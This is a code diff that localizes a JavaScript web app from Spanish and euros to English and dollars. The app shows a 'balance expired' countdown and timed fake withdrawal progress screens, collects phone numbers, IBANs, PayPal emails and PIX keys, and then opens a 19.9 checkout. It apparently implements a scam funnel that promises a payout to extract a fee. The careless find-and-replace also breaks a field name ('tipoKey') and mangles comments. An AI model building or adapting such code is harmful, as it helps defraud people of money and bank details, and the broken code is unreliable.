@@ -49,7 +49,7 @@
           typeof window.animateCurrencyCounter === "function"
         ) {
           // Reseta o texto para 0 antes de animar e força re-animação
-          popupCounter.textContent = "0,00 €";
+          popupCounter.textContent = "$0.00";
           window.animateCurrencyCounter(popupCounter, true); // true = forceReset
         }
       }, 50);
@@ -183,7 +183,7 @@
     let contador = setInterval(() => {
       if (tempoRestante < 0) {
         clearInterval(contador);
-        textElement.textContent = "TU SALDO HA EXPIRADO";
+        textElement.textContent = "YOUR BALANCE HAS EXPIRED";
         return;
       }
       let minutos = Math.floor(tempoRestante / 60);
@@ -214,7 +214,7 @@
       let contador = setInterval(() => {
         if (tempoRestante < 0) {
           clearInterval(contador);
-          labelElement.textContent = "Expirado";
+          labelElement.textContent = "Expired";
           minutesElement.textContent = "00";
           secondsElement.textContent = "00";
           return;
@@ -256,7 +256,7 @@
     // Reset UI
     progressBar.style.transition = "none";
     progressBar.style.width = "0%";
-    loadingText.textContent = "Iniciando...";
+    loadingText.textContent = "Starting...";
     loadingText.style.opacity = "1";
   }
 
@@ -268,10 +268,10 @@
     resetLoader(); // Ensure clean state
 
     const steps = [
-      { text: "Validando tus datos", progress: 25 },
-      { text: "Completando la retirada", progress: 50 },
-      { text: "Procesando transacción", progress: 75 },
-      { text: "Finalizando", progress: 100 },
+      { text: "Validating your data", progress: 25 },
+      { text: "Completing the withdrawal", progress: 50 },
+      { text: "Processing transaction", progress: 75 },
+      { text: "Finishing", progress: 100 },
     ];
     const stepDuration = 3000,
       textFadeDuration = 400,
@@ -316,7 +316,7 @@
         loadingText.style.opacity = 0;
 
         const t3 = setTimeout(() => {
-          loadingText.textContent = "¡Retirada completada!";
+          loadingText.textContent = "Withdrawal completed!";
           loadingText.style.opacity = 1;
         }, textFadeDuration);
         loaderState.timeouts.push(t3);
@@ -356,10 +356,10 @@
     progressBar.style.transition = "width 1.3s ease-in-out";
 
     const texts = [
-      "Validando datos...",
-      "Conectando al servidor...",
-      "Completando el rescate...",
-      "Casi listo...",
+      "Validating data...",
+      "Connecting to server...",
+      "Completing the redemption...",
+      "Almost done...",
     ];
 
     // Set initial text immediately
@@ -394,7 +394,7 @@
     // Loop de textos
     newLoadingState.interval = setInterval(() => {
       if (currentIndex >= totalSteps - 1) {
-        // Chegou no último passo ("Casi listo...")
+        // Chegou no último passo ("Almost done...")
         clearInterval(newLoadingState.interval);
 
         // Finaliza e redireciona
@@ -424,7 +424,7 @@
     newLoadingState.timeouts = [];
 
     if (loadingText) {
-      loadingText.textContent = "Validando acceso...";
+      loadingText.textContent = "Validating access...";
       loadingText.style.opacity = 1;
     }
     if (progressBar) {
@@ -454,7 +454,7 @@
           formData = JSON.parse(stored);
         }
       } catch (e) {
-        console.error("Erro ao ler localStorage", e);
+        console.error("Error reading localStorage", e);
       }
     }
 
@@ -504,7 +504,7 @@
       // O valor já deve estar formatado do input, mas garante formatação se necessário
       let formattedKey = formData.chavePix;
 
-      if (formData.tipoChave === "DNI") {
+      if (formData.tipoKey === "DNI") {
         // Se não estiver formatado, formata
         if (!formattedKey.includes(".") && !formattedKey.includes("-")) {
           const cleanCPF = formattedKey.replace(/\D/g, "");
@@ -515,7 +515,7 @@
               .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
           }
         }
-      } else if (formData.tipoChave === "Móvil") {
+      } else if (formData.tipoKey === "Móvil") {
         // Formata celular se necessário (opcional, geralmente já vem formatado)
         const cleanPhone = formattedKey.replace(/\D/g, "");
         if (
@@ -536,7 +536,7 @@
           }
         }
       }
-      // Para E-mail e Clave aleatoria, mantém como está
+      // Para E-mail e Random key, mantém como está
 
       pixKeyElement.textContent = formattedKey;
     }
@@ -555,7 +555,7 @@
     function showScreen(id, push = true) {
       const target = document.getElementById(id);
       if (!target) {
-        console.warn(`Tela "${id}" não encontrada.`);
+        console.warn(`Screen "${id}" not found.`);
         return;
       }
 
@@ -900,9 +900,9 @@
         // Mapeamento de Texto -> ID do Radio
         const typeToId = {
           CPF: "key-cpf",
-          "Correo electrónico": "key-email",
-          Celular: "key-celular",
-          "Clave aleatoria": "key-aleatoria",
+          "Email": "key-email",
+          Mobile: "key-celular",
+          "Random key": "key-aleatoria",
         };
 
         const radioId = typeToId[currentType];
@@ -918,30 +918,30 @@
       const method = opener.getAttribute("data-method") || "bizum";
       const config = {
         bizum: {
-          title: "Vincular Bizum",
+          title: "Link Bizum",
           icon: "images/bizum-logo.png",
-          label: "Número de teléfono",
+          label: "Phone number",
           placeholder: "+34 600 000 000",
           type: "tel",
         },
         banco: {
-          title: "Vincular Banco",
+          title: "Link Bank",
           icon: "images/skrill-logo.png",
           label: "IBAN",
           placeholder: "ES00 0000 0000 0000 0000 0000",
           type: "text",
         },
         paypal: {
-          title: "Vincular PayPal",
+          title: "Link PayPal",
           icon: "images/paypal-logo.jpg",
-          label: "Correo PayPal",
-          placeholder: "tu@correo.com",
+          label: "PayPal Email",
+          placeholder: "you@email.com",
           type: "email",
         },
         revolut: {
-          title: "Vincular Revolut",
+          title: "Link Revolut",
           icon: "images/revolut-logo.jpg",
-          label: "Número de teléfono",
+          label: "Phone number",
           placeholder: "+34 600 000 000",
           type: "tel",
         },
@@ -1022,7 +1022,7 @@
     activeModalId = null;
   }
 
-  /* ===== Lógica de Seleção de Chave PIX e Validação ===== */
+  /* ===== Lógica de Seleção de Key PIX e Validação ===== */
 
   // Helpers de Validação
   function validateCPF(cpf) {
@@ -1087,7 +1087,7 @@
   });
 
 
-  // 1. Seleção do Tipo de Chave (no popup #six)
+  // 1. Seleção do Tipo de Key (no popup #six)
   document.body.addEventListener("click", function (ev) {
     const optionRow = ev.target.closest("#six .option-row");
     if (!optionRow) return;
@@ -1099,7 +1099,7 @@
     const optionTextEl = optionRow.querySelector(".option-text");
     const selectedType = optionTextEl
       ? optionTextEl.textContent.trim()
-      : "Chave";
+      : "Key";
 
     // Atualiza o texto do seletor na tela #five
     const selectorText = document.getElementById("pix-selector-text");
@@ -1215,7 +1215,7 @@
     try {
       localStorage.setItem("userPixData", JSON.stringify(formData));
     } catch (e) {
-      console.error("Erro ao salvar no localStorage", e);
+      console.error("Error saving to localStorage", e);
     }
 
 
@@ -1260,7 +1260,7 @@
       }
     }
 
-    if (type === "Clave aleatoria") {
+    if (type === "Random key") {
       // Remove tudo que não é hex
       value = value.replace(/[^0-9a-fA-F]/g, "");
       if (value.length > 32) value = value.slice(0, 32); // Limita a 32 chars hex
@@ -1311,22 +1311,21 @@
 (function () {
   // --- helper: formata número como moeda BRL ---
   function formatBRL(value) {
-    return new Intl.NumberFormat("es-ES", {
+    return new Intl.NumberFormat("en-US", {
       style: "currency",
-      currency: "EUR",
+      currency: "USD",
     }).format(value);
   }
 
-  // --- helper: converte "735,48 €" -> number (4596.72) ---
+  // --- helper: converts "$735.48" -> number (735.48) ---
   function parseBRL(text) {
     if (!text) return 0;
-    // remove tudo exceto dígitos e vírgula/ponto
-    // suporta formatos: "735,48 €" ou "4596.72"
+    // remove everything except digits, dot and minus sign
+    // supports formats like "$735.48" or "4596.72"
     const cleaned = String(text)
       .replace(/\s/g, "")
-      .replace(/[Rr]\$\s?/, "")
-      .replace(/\./g, "") // remove separador de milhar
-      .replace(/,/g, "."); // troca vírgula decimal para ponto
+      .replace(/\$/g, "")
+      .replace(/,/g, ""); // remove thousands separator
     const n = parseFloat(cleaned);
     return isNaN(n) ? 0 : n;
   }
@@ -1504,9 +1503,9 @@
   let threeAnimated = false;
 
   function formatBRL(value) {
-    return value.toLocaleString("es-ES", {
+    return value.toLocaleString("en-US", {
       style: "currency",
-      currency: "EUR",
+      currency: "USD",
     });
   }
 
@@ -1593,9 +1592,9 @@
   const SEL = "#three .valor-currency-dois[data-amount-target]";
 
   function formatBRL(value) {
-    return value.toLocaleString("es-ES", {
+    return value.toLocaleString("en-US", {
       style: "currency",
-      currency: "EUR",
+      currency: "USD",
     });
   }
 
@@ -1711,7 +1710,7 @@ document.addEventListener("DOMContentLoaded", function () {
       var existing = document.querySelector("script[data-cooud-elements]");
       if (existing) {
         existing.addEventListener("load", function () { resolve(window.__CooudElements__); });
-        existing.addEventListener("error", function () { reject(new Error("No se pudo cargar Cooud Elements.")); });
+        existing.addEventListener("error", function () { reject(new Error("Could not load Cooud Elements.")); });
         return;
       }
       var script = document.createElement("script");
@@ -1719,10 +1718,10 @@ document.addEventListener("DOMContentLoaded", function () {
       script.async = true;
       script.dataset.cooudElements = "true";
       script.onload = function () {
-        if (!window.__CooudElements__) return reject(new Error("Cooud Elements no se inicializó."));
+        if (!window.__CooudElements__) return reject(new Error("Cooud Elements did not initialize."));
         resolve(window.__CooudElements__);
       };
-      script.onerror = function () { reject(new Error("No se pudo cargar Cooud Elements.")); };
+      script.onerror = function () { reject(new Error("Could not load Cooud Elements.")); };
       document.head.appendChild(script);
     });
   }
@@ -1745,7 +1744,7 @@ document.addEventListener("DOMContentLoaded", function () {
     var container = document.getElementById("cooud-payment");
     if (!container) return;
     var email = buyerEmail();
-    if (!email) { showPayError("No encontramos tu email. Vuelve y complétalo."); return; }
+    if (!email) { showPayError("We couldn't find your email. Go back and complete it."); return; }
     cooudStarted = true;
     showPayError("");
 
@@ -1759,12 +1758,12 @@ document.addEventListener("DOMContentLoaded", function () {
         return response.text().then(function (raw) {
           var data;
           try { data = JSON.parse(raw); } catch (e) {
-            throw new Error("El servidor devolvió una respuesta no válida (HTTP " + response.status + "). Publica la última versión del sitio e inténtalo de nuevo.");
+            throw new Error("The server returned an invalid response (HTTP " + response.status + "). Publish the latest version of the site and try again.");
           }
           if (!response.ok) {
             var detail = data.details && data.details.message;
             var requestId = data.requestId ? " · request_id: " + data.requestId : "";
-            throw new Error((detail || data.message || "No se pudo crear la sesión de pago.") + requestId);
+            throw new Error((detail || data.message || "Could not create the payment session.") + requestId);
           }
           return data;
         });
@@ -1785,16 +1784,16 @@ document.addEventListener("DOMContentLoaded", function () {
           window.location.assign("/up1?checkout_session_id=" + encodeURIComponent(config.sessionId) + "&productId=" + encodeURIComponent(PRODUCT_ID) + "&redirect_status=succeeded");
         },
         onError: function (error) {
-          showPayError((error && error.message ? error.message : "No se pudo procesar el pago.") + (error && error.code ? " (" + error.code + ")" : ""));
+          showPayError((error && error.message ? error.message : "Could not process the payment.") + (error && error.code ? " (" + error.code + ")" : ""));
         }
       });
       try {
-        if (window.ttq && window.ttq.track) window.ttq.track("InitiateCheckout", { content_id: PRODUCT_ID, content_type: "product", quantity: 1, value: 19.9, currency: "EUR" });
+        if (window.ttq && window.ttq.track) window.ttq.track("InitiateCheckout", { content_id: PRODUCT_ID, content_type: "product", quantity: 1, value: 19.9, currency: "USD" });
       } catch (error) { console.error("ttq InitiateCheckout failed", error); }
     }).catch(function (error) {
       cooudStarted = false;
       console.error("[Cooud v2] checkout bootstrap failed", error);
-      showPayError(error && error.message ? error.message : "No se pudo cargar el pago.");
+      showPayError(error && error.message ? error.message : "Could not load the payment.");
     });
   }
 
